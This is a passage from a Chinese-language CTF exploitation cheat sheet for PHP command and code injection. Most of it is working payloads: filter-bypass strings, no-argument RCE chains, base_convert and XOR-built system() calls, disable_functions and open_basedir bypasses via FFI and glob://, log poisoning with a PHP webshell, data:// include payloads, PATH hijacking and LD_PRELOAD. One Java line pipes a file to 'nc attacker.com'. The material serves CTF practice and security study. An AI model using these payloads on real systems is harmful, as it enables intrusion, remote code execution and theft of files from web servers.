// 步骤3：再次访问，日志中包含恶意代码，被include执行
// 步骤4：通过cmd参数执行命令
?c=include$_GET[1]?>&1=/var/log/nginx/access.log&cmd=cat flag.php
```

## 无参数RCE（PHP代码执行场景）

**⚠️ 重要说明**：本节内容**仅适用于PHP代码执行函数**（`eval()`、`assert()`等），通过PHP内置函数组合实现无参数RCE，主要用于文件读取，不能直接执行系统命令。**不适用于命令执行函数**（`system()`、`exec()`等）。

### 无参数RCE原理
```php
// 场景：eval()执行PHP代码，但过滤了所有参数（数字、字母、特殊字符）
// 可以使用PHP内置函数组合实现无参数RCE（主要是文件读取）

// 核心函数：
// localeconv() - 返回包含本地数字及货币格式信息的数组
// current() - 返回数组中的当前元素
// scandir() - 列出指定路径中的文件和目录
// array_flip() - 交换数组中的键和值
// array_rand() - 从数组中随机取出一个或多个键
// show_source() / highlight_file() - 高亮显示源码
```

### 无参数文件读取
```php
// 核心方法：localeconv() + scandir() + array_rand()
show_source(array_rand(array_flip(scandir(current(localeconv())))));

// 分解：localeconv()→"." → scandir(".") → array_flip() → array_rand() → show_source()

// 替代方法
show_source(array_rand(array_flip(scandir(getcwd()))));
show_source(next(scandir(current(localeconv()))));
```

### 无参数文件读取（非命令执行）
```php
// 注意：这些方法只能读取文件，不能执行系统命令
readfile(array_rand(array_flip(scandir(current(localeconv())))));
file_get_contents(array_rand(array_flip(scandir(current(localeconv())))));
include(array_rand(array_flip(scandir(current(localeconv())))));
// 如果include的文件包含PHP代码，可以执行PHP代码，但不能直接执行系统命令
```

## Bash内置环境变量绕过字符限制（命令执行场景）

**⚠️ 重要说明**：本节内容**仅适用于命令执行函数**（`system()`、`exec()`、`shell_exec()`等），利用Bash shell的环境变量特性，**不适用于PHP代码执行函数**（`eval()`、`assert()`等）。

**⚠️ 重要警告**：**如果过滤规则中包含`\$`，此章节的所有方法都不可用**（所有环境变量方法都包含`$`字符）

### 环境变量基础
```bash
# 常见环境变量：PATH、PWD、HOME、SHLVL、TERM、HOSTNAME、USER、RANDOM
```

### 环境变量字符串截取
```bash
# 语法：${变量名:起始位置:长度}，~表示从末尾开始
${PATH:~A}              # 取PATH末尾字符（通常是"n"）
${PATH:${#TERM}:${SHLVL:~A}}  # 使用变量长度作为索引

# 构造ls命令
${PATH:~A}${PATH:${#TERM}:${SHLVL:~A}}  # "n" + "s" = "ls"
```

### 使用${#变量}和$?表示数字
```bash
${#}                    # 0
${#?}                   # 1（$?返回值长度）
${#IFS}                 # 3
${#RANDOM}              # 4或5（需要多次尝试）

# 构造示例
${HOME::$?}             # 取HOME前1个字符（"/"）
${PWD::${#?}}           # 取PWD前1个字符（"/"）
```

### 实际利用示例
```bash
# 构造 /bin/cat flag.php
${PATH:~A}${PWD:~A} ????.???              # nl flag.php
${HOME::$?}???${HOME::$?}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???  # /???/??t ????.???
${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???  # 需要多次尝试
```

## PHP特性利用（PHP代码执行场景）

**⚠️ 重要说明**：本节内容**仅适用于PHP代码执行函数**（`eval()`、`assert()`等），利用PHP语言特性，**不适用于命令执行函数**（`system()`、`exec()`等）。

### 类型转换绕过
```php
// 在eval()等PHP代码执行函数中使用
// intval进制自动识别
intval('010', 0);           // 8（八进制自动识别）
intval('0x10', 0);          // 16（十六进制自动识别）

// trim特殊字符绕过
trim('%0Ctest%0C');         // %0C等特殊空白字符可能不被trim移除
```

## math函数绕过字符限制（PHP代码执行场景）

**⚠️ 重要说明**：本节内容**仅适用于PHP代码执行函数**（`eval()`、`assert()`等），通过math函数构造函数名和参数，绕过字母数字过滤。**不适用于命令执行函数**（`system()`、`exec()`等）。

### base_convert进制转换
```php
// 场景：eval()执行PHP代码，但过滤了字母数字，使用math函数构造
// base_convert(number, frombase, tobase) - 在任意进制之间转换数字
// 36进制包含0-9和a-z，正好可以表示26个字母

// 构造字母示例：
base_convert('system', 36, 10);    // 1751504350
base_convert(1751504350, 10, 36);  // system

base_convert('ls', 36, 10);        // 784
base_convert(784, 10, 36);         // ls

// 实际利用（在eval()中执行）：
base_convert(1751504350, 10, 36)(base_convert(784, 10, 36));
// 等价于：system(ls)
// 注意：这是在PHP代码执行场景中，通过math函数构造system()函数名和参数
```

### dechex和hexdec转换
```php
// dechex(dec_number) - 把十进制转换为十六进制
// hexdec(hexstring) - 把十六进制转换为十进制

// 示例：
dechex(22);        // 16（十六进制）
hexdec('16');      // 22（十进制）
```

### 使用math函数异或构造特殊字符
```php
// 当需要构造空格、*等特殊字符时
// 可以使用math函数异或构造

// 原理：a^b^a = b
// 如果 k^i^" " = 16（十六进制），则 dechex(22)^k^i = " "

// 构造空格示例：
dechex(22)^'asin'^'pow'           // 空格
dechex(56)^'asin'^'rad2deg'       // 空格

// 构造*示例：
// 需要找到合适的math函数组合
// 可以使用脚本枚举所有可能的组合

// 完整payload示例：
base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(22)^asin^pow))
// 等价于：system(cat . *)
// 其中：base_convert(15941,10,36) = "cat"
//      dechex(22)^asin^pow = " "（空格）
```

### math函数白名单利用
```php
// 场景：eval()执行PHP代码，但只允许math函数，使用math函数构造payload
// 当代码设置了math函数白名单时：
$whitelist = ['abs', 'acos', 'asin', 'base_convert', 'dechex', 'hexdec', ...];

// 利用步骤：
// 1. 使用base_convert构造函数名和参数
// 2. 使用dechex和异或构造特殊字符
// 3. 组合成完整的PHP代码执行payload（在eval()中执行）

// 示例（在eval()中执行）：
// 构造 system("cat flag.php")
base_convert(1751504350,10,36)(base_convert(784,10,36).(dechex(22)^asin^pow).base_convert(252053772011,10,36))
// 分解：
// base_convert(1751504350,10,36) = "system"
// base_convert(784,10,36) = "ls"
// dechex(22)^asin^pow = " "（空格）
// base_convert(252053772011,10,36) = "flag.php"
// 注意：这是在PHP代码执行场景中，通过math函数构造system()调用
```

### 正则表达式绕过
```php
// 多行匹配绕过
$input = "flag.php\n<?php system('cat flag.php');?>";
// 使用%0a换行符绕过^$匹配

// PCRE回溯限制绕过
$input = str_repeat('a', 1000000) . 'b';
// 触发pcre.backtrack_limit，可能导致匹配失败
```

### 变量覆盖利用
```php
// extract变量覆盖
extract($_GET);              // $_GET['file'] => $file
$$key=$$value;               // 变量变量覆盖

// parse_str + extract组合
parse_str('file=flag.php', $params);
extract($params);            // $file = 'flag.php'

// $_POST[key]绕过isset检查（无引号）
$_POST[key]                  // 绕过isset($_POST['key'])
```

### 反射类和内置类利用
```php
// ReflectionClass反射类
$class = new ReflectionClass('ctfshow');
echo $class->getFileName();  // 获取文件路径

// FilesystemIterator目录遍历
$iterator = new FilesystemIterator('/var/www/html');
foreach ($iterator as $file) {
    echo $file->getFilename();
}
```

## 突破禁用函数（disable_functions）（PHP代码执行场景）

**⚠️ 重要说明**：本节内容适用于**PHP代码执行函数**（`eval()`、`assert()`等），当命令执行函数（`system()`、`exec()`等）被禁用时，使用PHP文件操作函数替代，不适用于直接命令执行函数。

### 文件读取函数替代
```php
// 当system、exec等命令执行函数被禁用时
// 可以使用文件读取函数读取文件内容

// 方法1：高亮显示源码
show_source("flag.php");
highlight_file("flag.php");

// 方法2：打印变量信息
var_dump(file_get_contents("flag.php"));
var_export(file_get_contents("flag.php"));

// 方法3：使用fopen系列函数逐字符/逐行读取
$a = fopen("flag.php", "r");
while ($b = fgets($a)) {
    echo $b;
}

// 方法4：使用fread读取
$a = fopen("flag.php", "r");
echo fread($a, 1000);

// 方法5：使用fpassthru输出
$a = fopen("flag.php", "r");
fpassthru($a);

// 方法6：使用fgetcsv读取（CSV格式）
$a = fopen("flag.php", "r");
while ($line = fgetcsv($a)) {
    print_r($line);
}
```

### 目录遍历函数替代
```php
// 当需要查找文件位置时，可以使用目录遍历函数

// 方法1：scandir列出目录
print_r(scandir("/"));
var_dump(scandir("/"));
var_export(scandir("/"));

// 方法2：glob使用glob协议（不受open_basedir限制）
var_export(glob("/*"));

// 方法3：DirectoryIterator目录迭代器
$a = new DirectoryIterator('glob:///*');
foreach ($a as $f) {
    echo $f->__toString() . " ";
}

// 方法4：使用foreach输出
$a = scandir("/");
foreach ($a as $value) {
    echo $value . " ";
}
```

### 文件操作绕过
```php
// 当文件读取函数也被禁用时，可以使用文件操作函数

// 方法1：复制文件到可访问位置
copy("flag.php", "a.txt");
// 然后访问 http://target/a.txt

// 方法2：重命名文件
rename("flag.php", "b.txt");
// 然后访问 http://target/b.txt
```

### exit/die提前结束绕过
```php
// 当输出被字符替换时（如将所有字母数字替换为?）
// 可以使用exit()或die()提前结束进程，绕过后续处理

// 示例代码：
eval($c);
$s = ob_get_contents();
ob_end_clean();
echo preg_replace("/[0-9]|[a-z]/i", "?", $s);

// 绕过方法：
var_export(glob("/*"));exit();
include("/flag.txt");die();

// 原理：exit()和die()会立即终止脚本执行
// 后续的字符替换代码不会执行
```

### open_basedir绕过
```php
// open_basedir限制了可访问的目录
// 但glob://协议不受open_basedir限制

// 方法1：使用glob://协议
$a = new DirectoryIterator('glob:///*');
foreach ($a as $f) {
    echo $f->__toString() . " ";
}

// 方法2：使用glob函数
var_export(glob("/*"));

// 方法3：PHP 7.0-7.4 UAF漏洞绕过（debug_backtrace）
// 利用debug_backtrace()返回已销毁变量的引用，导致UAF
// 可以绕过disable_functions和open_basedir
// 需要构造复杂的利用链（参考web 72的完整POC）
```

### FFI绕过禁用函数（PHP 7.4+）
```php
// FFI（Foreign Function Interface）允许调用C函数
// 可以绕过disable_functions

// 利用方法：
$ffi = FFI::cdef("int system(const char *command);");
// 创建一个system函数对象

$a = "/readflag > 1.txt";
// 无回显，需要写入文件

$ffi->system($a);
// 通过FFI调用system函数

exit();

// 注意：
// 1. 需要PHP 7.4+
// 2. 需要启用FFI扩展
// 3. 需要找到可执行的文件（如/readflag）
```

### SQL读取文件绕过
```php
// 当所有文件读取函数都被禁用时
// 可以通过MySQL的load_file()函数读取文件

// 前提条件：
// 1. 可以连接MySQL数据库
// 2. 知道数据库连接信息
// 3. 有FILE权限

// 利用方法：
try {
    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');
    
    foreach ($dbh->query('select load_file("/flag36.txt")') as $row) {
        echo ($row[0]) . "|";
    }
    
    $dbh = null;
} catch (PDOException $e) {
    echo $e->getMessage();
    exit(0);
}
exit(0);

// 注意：load_file()需要FILE权限
// 文件路径必须是绝对路径
```

## 快速定位和利用

**关键词识别**：

### 命令执行函数识别
- 直接命令执行：搜索`system()`、`exec()`、`shell_exec()`、`passthru()`、`popen()`、`proc_open()`等
- 空格检测：搜索过滤`space`、`空格`的代码（适用于命令执行）
- 命令符过滤：搜索`&&`、`||`、`;`、`|`的黑名单（适用于命令执行）
- 关键字过滤：搜索过滤`flag`、`cat`、`system`等关键字的代码（适用于命令执行）
- 通配符过滤：搜索是否过滤`*`、`?`通配符（适用于命令执行）
- 反斜杠处理：搜索反斜杠转义的处理逻辑（适用于命令执行）
- 环境变量绕过：搜索过滤小写字母、数字的场景，考虑Bash内置环境变量（适用于命令执行）
- 整数运算：搜索过滤数字的场景，考虑`$(( ))`构造（适用于命令执行）
- 临时文件：搜索文件上传功能，考虑临时文件条件竞争（适用于命令执行）

### PHP代码执行函数识别
- PHP代码执行：搜索`eval()`、`assert()`、`create_function()`、`preg_replace()` with `/e` modifier等
- include无括号：搜索`include`、`require`函数的使用（适用于PHP代码执行）
- 变量覆盖：搜索`extract()`、`parse_str()`函数（适用于PHP代码执行）
- 反射类：搜索`ReflectionClass`、`ReflectionMethod`等反射API（适用于PHP代码执行）
- 禁用函数：搜索`disable_functions`配置（适用于PHP代码执行）
- open_basedir限制：搜索`open_basedir`配置（适用于PHP代码执行）
- 无参数RCE：搜索过滤所有参数的场景，考虑`localeconv()`、`scandir()`组合（适用于PHP代码执行）
- math函数白名单：搜索只允许math函数的场景，考虑`base_convert()`、`dechex()`（适用于PHP代码执行）
- 无字母数字过滤：搜索`preg_match('/[a-zA-Z0-9]/')`类型过滤（适用于PHP代码执行）

**测试优先级**：

**⚠️ 首先确定漏洞类型**：
- **命令执行函数**（`system()`、`exec()`等）：使用shell命令绕过技巧
- **PHP代码执行函数**（`eval()`、`assert()`等）：使用PHP代码绕过技巧

### 命令执行函数测试流程
1. **直接命令执行**（无过滤）
2. **先检查过滤规则**：分析哪些字符被过滤（空格、`$`、`;`、`|`、`*`、`?` 等）
3. **根据过滤规则选择绕过方式**：
   - 如果**未过滤 `$`**：尝试 IFS/Tab 绕过（`${IFS}`、`%09`）
   - 如果**过滤了 `$`**：使用 `<>` 重定向或花括号扩展
   - 如果**未过滤 `|`**：尝试命令分隔符绕过（`||`、`&&`）
   - 如果**过滤了 `;` 和 `|`**：尝试其他绕过方式
4. **文件读取替代**（tac、od、nl、rev 等，检查命令是否在黑名单中）
5. **通配符利用**（`?`、`*`，检查是否被过滤）
6. **反斜杠转义**（`\g` 绕过关键字过滤）
7. **环境变量绕过**（${PATH:~A}、${#变量}构造）
8. **整数运算构造**（$(( ))构造数字）
9. **编码混淆**（十六进制、八进制、Base64编码）
10. **无回显RCE**（DNS、HTTP外带、文件写入）

### PHP代码执行函数测试流程
1. **直接PHP代码执行**（无过滤）
2. **先检查过滤规则**：分析哪些字符被过滤（括号、引号、分号、关键字等）
3. **根据过滤规则选择绕过方式**：
   - **类闭合绕过**（`};`、`?>`闭合）
   - **反斜杠绕过**（`create_function`反斜杠逃逸）
   - **反射类利用**（`ReflectionClass`）
   - **嵌套调用绕过**（`call_user_func`嵌套）
4. **include绕过**（无括号包含、data://协议、日志包含）
5. **无参数RCE**（localeconv、scandir、array_rand组合）
6. **math函数绕过**（base_convert、dechex、异或构造）
7. **无字母无数字执行**（取反`~`、异或`^`、位运算）
8. **突破禁用函数**（文件读取替代、目录遍历、open_basedir绕过、FFI、SQL读取）
9. **无回显RCE**（DNS、HTTP外带、文件写入）

**⚠️ 重要提醒**：
- **必须先分析过滤规则**，再选择对应的绕过方式
- **不要盲目使用** skill 文档中的绕过技巧，必须验证是否适用于当前过滤规则
- **验证方法**：构造 payload 后，检查是否包含被过滤的字符

**CTF常见组合**：

### PHP代码执行函数组合
- `eval()` + 类闭合 + 在PHP代码中调用`system()`执行命令
- `create_function()` + 反斜杠绕过
- `eval()` + 无字母数字 + 位运算构造payload
- `include` + data://协议 + base64编码
- `include` + 日志包含 + User-Agent注入
- `eval()` + 无参数RCE + localeconv + scandir + array_rand
- `eval()` + math函数 + base_convert + dechex异或
- `eval()` + 禁用函数绕过 + show_source + glob://协议

### 命令执行函数组合
- `system()` + 输出重定向 + 特殊命令(tee/nl)
- `system()` + 环境变量绕过 + ${PATH:~A} + ${#变量}
- `system()` + $(( ))整数运算 + 构造数字
- `system()` + 临时文件上传 + 通配符匹配 + 条件竞争
- `system()` + 编码混淆 + 十六进制/八进制编码

## 容器和沙箱环境特定绕过

### Docker/容器环境检测和绕过
```bash
# 检测是否在容器内运行
ls -la /.dockerenv          # 存在则在Docker中
cat /proc/1/cgroup | grep docker

# 读取容器环境变量
env | grep -i docker
env | grep -i container

# 容器内逃逸技巧（仅在有挂载敏感目录时）
ls /var/run/docker.sock     # Docker套接字（可能存在）
mount | grep -i host        # 查找主机挂载

# 利用容器内的命令读取主机文件
cat /proc/sys/kernel/hostname
```

### chroot/jailed环境绕过
```bash
# 检测chroot环境
ls -la /proc/1/root

# 在jailed环境中寻找逃逸
find / -name "*.sh" -type f -perm /111  # 查找可执行脚本
```

## 环境变量污染高级技巧

### PATH环境变量高级污染
```bash
# 基础污染
PATH=/tmp:$PATH
export PATH=/tmp:$PATH

# 利用相对路径
./malicious_ls        # 如果当前目录下有ls脚本
cd /tmp && mkdir bin && cp /bin/cat bin/ && export PATH=/tmp/bin:$PATH

# 污染特定的命令路径
alias cat='/bin/cat flag.txt'
```

### LD_PRELOAD库注入
```bash
# 编译恶意库
gcc -shared -fPIC hook.c -o /tmp/hook.so

# 设置LD_PRELOAD环境变量
export LD_PRELOAD=/tmp/hook.so

# 执行任何使用libc的命令都会加载恶意库
cat flag.txt
```

### IFS和其他环境变量污染
```bash
# IFS污染
IFS=$'\n'; for cmd in cat flag.txt; do echo $cmd; done

# LANG/LC_ALL污染（改变字符编码）
export LC_ALL=C
export LANG=C

# HOME目录污染
export HOME=/tmp
# 某些命令会读取~/.bashrc等文件
```

## URL和其他协议编码绕过

### URL编码多层组合
```bash
# 第一层URL编码
%63%61%74%20%66%6C%61%67%2E%74%78%74  # cat flag.txt

# 多次URL编码（某些框架不会完全解码）
%2563%2561%2574                        # cat的二次编码

# 混合编码
%63at%20flag.txt                       # 部分编码
```

### Unicode编码和规范化
```bash
# Unicode替代字符
ｃａｔ flag.txt                         # 全宽字符（某些系统识别）

# Unicode转义序列
\u0063\u0061\u0074 flag.txt

# UTF-8字节序列绕过
cat flag.txt (使用UTF-8编码的空格替代ASCII空格)
```

## 变量和间接引用绕过

### Shell变量扩展
```bash
# 变量嵌套
cmd='cat flag.txt'
$cmd                                    # 执行变量内容

# 参数展开
${cmd}                                  # 同上
${cmd:0:3}flag.txt                      # 字符串切片

# 间接引用
indirection=cmd
${!indirection}                         # 扩展到cmd变量的值
```

### eval和source链式执行
```bash
# eval执行
eval "cat flag.txt"

# source/. 执行脚本
source /tmp/script.sh
. /tmp/script.sh

# 通过命令替换嵌套eval
eval $(echo "cat flag.txt")
```

## 特殊Shell特性利用

### Bash特殊变量
```bash
# $0 = 脚本名称，可能被利用
${0##*/}                               # 获得命令名称

# $@ 和 $* = 参数列表
"$@"                                   # 参数作为独立词汇
$*                                     # 参数作为单个词汇

# $? = 上个命令的返回码
# 某些注入点可能读取返回码进行条件执行
```

### Bash进程替换
```bash
# 进程替换 >()、<()
cat <(cat flag.txt)                    # 读取另一个进程的输出

# 管道到子shell
(cat flag.txt) | grep pattern
```

## 时间基盲打高级技巧

### 基于HTTP响应码的推断
```bash
# 使用timeout命令
timeout 1 cat flag.txt && echo "exists"

# 根据退出码推断（但通常无法获取）
cat flag.txt; echo $?
```

### 基于系统负载的推断
```bash
# 利用CPU密集型操作测量执行时间
if [ "$(head -c1 flag.txt)" = "f" ]; then dd if=/dev/zero of=/dev/null bs=1M count=1000; fi

# 观察系统资源使用推断条件是否成立
```

## 符号链接和重定向利用

### 符号链接注入
```bash
# 创建指向敏感文件的符号链接
ln -s /etc/passwd /tmp/flag.txt
cat /tmp/flag.txt

# 利用通配符展开符号链接
cat /tmp/*                             # 如果有符号链接会被跟随
```

### 文件描述符操作
```bash
# 使用文件描述符
exec 3< flag.txt
cat <&3

# 重定向文件描述符
exec {fd}<flag.txt
cat <&{fd}
```

## 编码混淆的识别

### 对审计员的提示
```bash
# 寻找这些编码模式
- %xx 十六进制编码（URL编码）
- \xhh 十六进制转义（Bash）
- \ooo 八进制转义（Bash）
- 0x 十六进制字面量
- chr() 字符函数调用
- ${IFS}、${PATH:0:0} 等变量技巧
- Base64 字符串（特别是在eval中）
- 使用|、;、||、&&等连接的多个命令
```

## 框架和应用特定绕过

### Node.js child_process绕过
```javascript
// 基础执行
require('child_process').exec('cat flag.txt', (err, stdout) => {});

// 使用数组参数（不会执行shell，更安全但仍可被滥用）
require('child_process').execFile('cat', ['flag.txt']);

// 环境变量污染
require('child_process').exec('$CMD', {env: {CMD: 'cat flag.txt'}});
```

### Python subprocess绕过
```python
# shell=True允许注入
import subprocess
subprocess.run('cat flag.txt', shell=True)

# 环境变量污染
import os
os.environ['PYTHONPATH'] = '/tmp'
subprocess.run(['python', '-c', 'import evil; evil.run()'])

# 参数污染
subprocess.run(['cat', '$FLAG'], shell=False)  # $FLAG不会展开（安全）
subprocess.run(['sh', '-c', 'cat $FLAG'], shell=False)  # 仍会被执行
```

### Java Runtime.exec绕过
```java
// 使用sh -c绕过数组参数化
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "cat flag.txt | nc attacker.com 1234"});

// 环境变量继承
ProcessBuilder pb = new ProcessBuilder("java", "-jar", "/tmp/malicious.jar");
pb.environment().put("LD_PRELOAD", "/tmp/hook.so");
pb.start();
```

## 高级绕过技巧组合（多重防护绕过）

### 组合1：过滤空格+美元符号+分号（命令执行场景）

**场景**：`preg_match("/\s|\$|;/", $c)`

**过滤内容**：空格、`$`、`;`

**绕过方法**：
```bash
# ❌ 不可用：${IFS}（包含$）、$IFS$9（包含$）
# ❌ 不可用：ls;cat（包含;和空格）

# ✅ 可用：使用<>重定向替代空格
tac<>flag.php

# ✅ 可用：使用花括号展开
{tac,flag.php}

# ✅ 可用：使用||或&&替代分号
tac<>flag.php||
tac<>flag.php&&cat<>/dev/null
```

**关键技巧**：
- `<>` 重定向可以替代空格（不包含`$`）
- `||` 或 `&&` 可以替代 `;`（进行命令分隔）
- 花括号展开 `{cmd,arg}` 在shell层面产生空格

---

### 组合2：过滤空格+关键字+通配符（命令执行场景）

**场景**：`preg_match("/\s|cat|flag|\*|\?/", $c)`

**过滤内容**：空格、`cat`、`flag`、`*`、`?`

**绕过方法**：
```bash
# ❌ 不可用：cat flag.txt（包含空格、cat、flag）
# ❌ 不可用：tac fla*.php（包含空格、*）
# ❌ 不可用：nl fla?.php（包含空格、?）

# ✅ 可用：使用<>重定向 + 反斜杠转义 + 替代命令
tac<>fla\g.php
nl<>fla\g.php

# ✅ 可用：使用单引号分割关键字
tac<>fla'g'.php
tac<>fla''g.php

# ✅ 可用：使用替代命令避免cat关键字
nl<>fla\g.php
od<>fla\g.php
head<>fla\g.php
```

**关键技巧**：
- 反斜杠转义 `fla\g` 绕过关键字过滤
- 单引号分割 `fla'g'` 或 `fla''g` 绕过关键字过滤
- 使用 `tac`、`nl`、`od`、`head` 等替代 `cat`

---

### 组合3：过滤所有危险字符+输出重定向（命令执行场景）

**场景**：`system($c . " >/dev/null 2>&1")`（命令后附加输出重定向）

**保护机制**：输出被重定向到 `/dev/null`，无法看到命令输出

**绕过方法**：
```bash
# 方法1：使用||中断原命令
sort flag.txt||

# 实际执行的命令：
# sort flag.txt|| >/dev/null 2>&1
# sort flag.txt执行并输出，||后面的重定向被当作第二个命令（失败被忽略）

# 方法2：使用;中断原命令
sort flag.txt;

# 实际执行的命令：
# sort flag.txt; >/dev/null 2>&1
# sort flag.txt执行并输出，;后面的重定向被当作第二个命令

# 方法3：使用tee写入文件
tac flag.php|tee /var/www/html/1.txt||
# 然后访问 http://target/1.txt
```

**关键技巧**：
- 使用 `||` 或 `;` 中断原命令，使第二个命令（输出重定向）失效
- 使用 `tee` 将输出同时写入文件，绕过无回显限制

---

### 组合4：PHP代码执行+禁用函数+open_basedir限制

**场景**：`eval($c)` + `disable_functions=system,exec,shell_exec,...` + `open_basedir=/var/www/html`

**保护机制**：
- `disable_functions` 禁用了所有命令执行函数
- `open_basedir` 限制只能访问 `/var/www/html` 目录

**绕过方法**：
```php
// 步骤1：使用glob://协议绕过open_basedir限制
$a = new DirectoryIterator('glob:///*');
foreach ($a as $f) {
    echo $f->__toString() . " ";
}

// 步骤2：找到flag文件位置后，使用show_source读取
show_source('glob:///flag.txt');

// 步骤3：或使用readfile读取
readfile('glob:///flag.txt');

// 组合payload（在eval中执行）：
$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo $f->__toString()." ";}
```

**关键技巧**：
- `glob://` 协议不受 `open_basedir` 限制
- `DirectoryIterator` 可以遍历目录
- `show_source()` 和 `readfile()` 可以读取文件

---

### 组合5：无字母数字+禁用函数（PHP代码执行场景）

**场景**：`preg_match("/[a-zA-Z0-9]/", $c)` + `disable_functions=system,exec,...`

**保护机制**：
- 过滤所有字母和数字
- 禁用命令执行函数

**绕过方法**：
```php
// 使用取反运算符~构造函数名（在eval中执行）
-(~%8C%86%8C%8B%9A%92)(~%99%93%90%8D%9B%A0%97%90%8D%9A%8B)
// 等价于：show_source(flag.php)

// 流程：
// 1. ~%8C%86%8C%8B%9A%92 = "show_source"
// 2. ~%99%93%90%8D%9B%A0%97%90%8D%9A%8B = "flag.php"
// 3. show_source("flag.php") 读取文件

// 或使用异或运算符^构造（在eval中执行）：
${"{{{"^"?<>/"}  // 等价于_GET
${${"{{{"^"?</"}[0]}(${"{{{"^"?<>/"}[1])
```

**关键技巧**：
- 使用 `~` 取反运算符构造函数名和参数
- 使用 `^` 异或运算符构造变量名
- 使用 `show_source()` 替代 `system()` 读取文件

---

### 组合6：过滤空格+数字+美元符号（命令执行场景）

**场景**：`preg_match("/\s|[0-9]|\$/", $c)`

**过滤内容**：空格、数字、`$`

**绕过方法**：
```bash
# ❌ 不可用：${IFS}（包含$）、%09（包含0、9）、cat flag.txt（包含空格）

# ✅ 可用：使用<>重定向 + 无数字文件名
tac<>flag.php
nl<>flag.txt

# ✅ 可用：使用花括号展开
{tac,flag.php}

# ✅ 可用：如果文件名包含数字，使用通配符（如果未过滤*或?）
tac<>fla*.php
nl<>flag.???
```

**关键技巧**：
- `<>` 重定向替代空格（不包含 `$`）
- 花括号展开 `{cmd,arg}` 不包含数字和 `$`
- 如果文件名包含数字，使用通配符 `*` 或 `?`（前提是未被过滤）

---

### 组合7：无参数RCE+字母数字过滤（PHP代码执行场景）

**场景**：`eval($c)` + `preg_match("/[a-zA-Z0-9]/", $c)` + 无法传递参数

**保护机制**：
- 过滤所有字母和数字
- 无法通过GET/POST传递参数

**绕过方法**：
```php
// 使用无参数RCE + 取反运算符（在eval中执行）
-(~%8C%86%8C%8B%9A%92)(~%9E%8D%8D%9E%87%8D%9E%91%9B)
// 等价于：show_source(array_rand(array_flip(scandir(current(localeconv())))))

// 流程：
// 1. localeconv() → 返回包含"."的数组
// 2. current(localeconv()) → "."
// 3. scandir(".") → 列出当前目录文件
// 4. array_flip() → 交换键值
// 5. array_rand() → 随机取一个文件名
// 6. show_source() → 显示文件内容

// 或使用简化版本（在eval中执行）：
-(~%8C%86%8C%8B%9A%92)(-(~%91%9A%87%9B))
// 等价于：show_source(next(scandir(current(localeconv()))))
```

**关键技巧**：
- 使用 `localeconv()` 获取 "." 目录
- 使用 `scandir()` 列出文件
- 使用 `array_rand()` 或 `next()` 获取文件名
- 使用 `~` 取反运算符绕过字母数字过滤

---

### 组合8：data://协议+base64编码+文件后缀限制（PHP代码执行场景）

**场景**：`include($c . ".php")` + `preg_match("/flag|cat|system/", $c)`

**保护机制**：
- 代码自动添加 `.php` 后缀
- 过滤 `flag`、`cat`、`system` 关键字

**绕过方法**：
```php
// 使用data://协议 + base64编码（在include中执行）
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhKi5waHAnKTs/Pg==

// base64解码后：<?php system('tac fla*.php');?>
// 实际包含：data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhKi5waHAnKTs/Pg==.php
// 由于前面的PHP语句已经闭合，后面的.php不起作用

// 或使用<?=替代<?php（当过滤php关键字时）
?c=data://text/plain,<?=`tac fla*.php`?>

// 或使用通配符替代flag关键字
?c=data://text/plain,<?=system('tac fla*')?>
```

**关键技巧**：
- 使用 `data://` 协议包含任意PHP代码
- 使用 base64 编码绕过关键字过滤
- PHP语句闭合后，后续的 `.php` 后缀不起作用
- 使用通配符 `*` 替代被过滤的关键字

---

### 组合9：日志包含+User-Agent注入+无分号（PHP代码执行场景）

**场景**：`include($c)` + `preg_match("/;/", $c)` + 过滤分号

**保护机制**：过滤分号 `;`

**绕过方法**：
```php
// 步骤1：包含日志文件（使用?>闭合PHP，绕过分号）
?c=include$_GET[1]?>&1=/var/log/nginx/access.log

// 步骤2：通过User-Agent写入一句话木马
// User-Agent: <?php system($_GET['cmd'])?>

// 步骤3：再次访问，日志中的恶意代码被include执行
?c=include$_GET[1]?>&1=/var/log/nginx/access.log&cmd=tac flag.php

// 实际执行流程：
// 1. include $_GET[1]?> → 包含日志文件，?>闭合PHP
// 2. 日志中包含 User-Agent: <?php system($_GET['cmd'])?>
// 3. include 执行日志中的PHP代码
// 4. system($_GET['cmd']) 执行命令
```

**关键技巧**：
- 使用 `?>` 闭合PHP，绕过分号要求
- 通过 User-Agent、Referer 等HTTP头写入恶意代码到日志
- 包含日志文件执行恶意代码
- `include` 可以不使用括号（语言构造）

---

### 组合10：FFI绕过+无回显+文件写入（PHP代码执行场景）

**场景**：`eval($c)` + `disable_functions=system,exec,...` + 无输出

**保护机制**：
- 禁用所有命令执行函数
- 无回显（输出被抑制）

**绕过方法**：
```php
// 使用FFI调用C函数 + 写入文件（在eval中执行）
$ffi = FFI::cdef("int system(const char *command);");
$a = "cat flag.php > /var/www/html/1.txt";
$ffi->system($a);
exit();

// 然后访问 http://target/1.txt 获取flag

// 或使用readflag二进制（如果存在）
$ffi = FFI::cdef("int system(const char *command);");
$a = "/readflag > /var/www/html/result.txt";
$ffi->system($a);
exit();
```

**关键技巧**：
- FFI（PHP 7.4+）可以调用C函数，绕过 `disable_functions`
- 使用 `>` 重定向将输出写入文件
- 使用 `exit()` 立即终止脚本，避免后续处理
- 通过HTTP访问写入的文件获取结果

---

### 组合11：环境变量污染+PATH劫持+符号链接（命令执行场景）

**场景**：允许设置环境变量 + 执行系统命令

**绕过方法**：
```bash
# 方法1：PATH环境变量污染
# 步骤1：在/tmp创建恶意ls脚本
echo '#!/bin/sh' > /tmp/ls
echo 'cat /flag.txt' >> /tmp/ls
chmod +x /tmp/ls

# 步骤2：污染PATH环境变量
export PATH=/tmp:$PATH

# 步骤3：执行ls命令（实际执行/tmp/ls）
ls

# 方法2：LD_PRELOAD库注入
# 步骤1：编译恶意库hook.so
# hook.c内容：在某个libc函数中注入代码

# 步骤2：设置LD_PRELOAD
export LD_PRELOAD=/tmp/hook.so

# 步骤3：执行任何使用libc的命令
cat anything  # 会加载hook.so并执行注入的代码

# 方法3：符号链接注入
ln -s /etc/passwd /tmp/flag.txt
